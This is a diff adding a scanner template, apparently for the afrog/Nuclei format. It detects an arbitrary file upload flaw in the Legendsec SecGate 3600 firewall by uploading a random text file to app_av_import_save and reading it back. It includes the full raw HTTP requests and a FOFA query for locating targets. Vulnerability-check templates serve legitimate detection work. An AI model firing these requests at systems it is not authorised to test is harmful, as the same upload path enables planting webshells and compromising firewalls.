@@ -1,0 +1,57 @@
+id: secworld-secgate3600-obj-av-import-save-fileupload
+
+info:
+  name: 网神 SecGate 3600 防火墙 obj_av_import_save 任意文件上传
+  author: Observer
+  severity: critical
+  description: |
+    网神 SecGate 3600 防火墙 app_av_import_save 接口存在任意文件上传，上传随机文本后再读取附件目录做概念验证，不落地 webshell。
+  reference:
+    - https://github.com/zan8in/afrog-pocs/blob/main/vulnerability/secworld-secgate3600-obj-av-import-save-fileupload.yaml
+  metadata:
+    max-request: 2
+    fofa-query: fid="1Lh1LHi6yfkhiO83I59AYg=="
+    verified: true
+  tags: secworld,secgate,fileupload,firewall
+
+variables:
+  filename: "{{rand_base(8)}}"
+  marker: "{{rand_base(32)}}"
+  boundary: "{{rand_base(8)}}"
+
+http:
+  - raw:
+      - |
+        POST /?g=app_av_import_save HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{boundary}}
+
+        ------WebKitFormBoundary{{boundary}}
+        Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+        10000000
+        ------WebKitFormBoundary{{boundary}}
+        Content-Disposition: form-data; name="upfile"; filename="{{filename}}.txt"
+        Content-Type: text/plain
+
+        {{marker}}
+        ------WebKitFormBoundary{{boundary}}
+        Content-Disposition: form-data; name="submit_post"
+
+        obj_app_upfile
+        ------WebKitFormBoundary{{boundary}}
+        Content-Disposition: form-data; name="__hash__"
+
+        0b9d6b1ab7479ab69d9f71b05e0e9445
+        ------WebKitFormBoundary{{boundary}}--
+      - |
+        GET /attachements/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_2 == 200
+          - contains(body_2, '{{marker}}')
+        condition: and
